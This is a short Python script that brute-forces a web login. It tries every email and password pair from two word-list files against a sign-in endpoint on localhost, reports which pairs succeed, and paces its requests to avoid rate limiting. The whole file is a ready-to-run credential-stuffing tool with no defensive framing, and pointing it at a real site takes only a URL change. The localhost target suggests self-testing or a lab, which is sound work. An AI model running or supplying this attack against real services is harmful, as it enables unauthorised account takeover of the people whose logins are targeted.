import requests
import time

url = 'http://127.0.0.1:5000/auth/signin'

with open("emails.txt", "r") as users, open("passwords.txt", "r") as pwds:
    emails = [line.strip() for line in users]
    passwords = [line.strip() for line in pwds]

    session = requests.Session()

    for email in emails:
        for pwd in passwords:
            data = {
                "email": email,
                "password": pwd,
                "csrf_token": ""
            }

            response = session.post(url, data=data,allow_redirects=False)

            if response.status_code == 200:
                print(f"[+] Submitted")
                break
            elif response.status_code == 401:
                print(f"[-] Failed: {email}:{pwd}")
            elif response.status_code == 302:
                print(f"[-] SUCCESS: {email}:{pwd}")
                break
            elif response.status_code == 429:
                print("[-] TIME OUT: Too many requests")
            else:
                print(f"[!] Unexpected response: {response.status_code}")

            time.sleep(.1)  # optional: slow down to avoid rate limiting